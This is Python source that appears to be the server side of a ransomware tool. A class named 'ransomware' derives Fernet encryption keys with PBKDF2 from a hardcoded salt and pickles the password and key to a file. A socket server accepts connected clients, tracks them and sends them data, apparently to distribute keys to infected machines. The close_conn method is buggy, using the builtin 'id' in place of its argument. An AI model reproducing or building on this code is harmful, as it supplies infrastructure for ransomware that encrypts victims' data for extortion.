import socket
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import json
import pickle

class ransomware:

    def __init__(self):
        self.salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c'
        self.kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=1000000,
            backend=default_backend()
            )

    def key_gen(self, passwd):

        if passwd:
            self.passwd = passwd
        else:
            self.passwd = Fernet.generate_key()

        self.key = base64.urlsafe_b64encode(self.kdf.derive(self.passwd))
        return self.key
    
    def save_key(self, filename):
        try:
            data = {
                'password' : self.passwd,
                'salt' : self.salt,
                'key' : self.key
            }
            with open(filename, 'wb') as file:
                data = pickle.dumps(data)
                file.write(data)
                file.close()

        except  Exception as e:
            print("save_key error: %s" %str(e) )
        
class Client_handler:
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.cl_list = {}
        self.id = 0

    def start_server(self, host, port):
        try:
            self.host = host
            self.port = port
            self.server.bind((host, port))
            self.server.listen(5)

        except Exception as e:
            print("Error occured in start_server: %s"%str(e))
    
    def add_client(self):
        try:
            sock, addr = self.server.accept()
            self.id += 1
            self.cl_list[self.id] = {
                'SOCK' : sock,
                'IP' : addr[0],
                'PORT' : addr[1]
            }
            print(self.cl_list[self.id])
            return addr

        except Exception as e:
            print('Error occured in listener: %s'% str(e))
    
    def close_conn(self, client_id):
        try:
            self.cl_list[id]['SOCK'].close()
            self.cl_list[id]['PORT'] = "CLOSED"
        except Exception as e:
            print("error in close_conn : %s" %str(e))

    def send(self, cid, data):
        self.cl_list[cid]['SOCK'].send(data)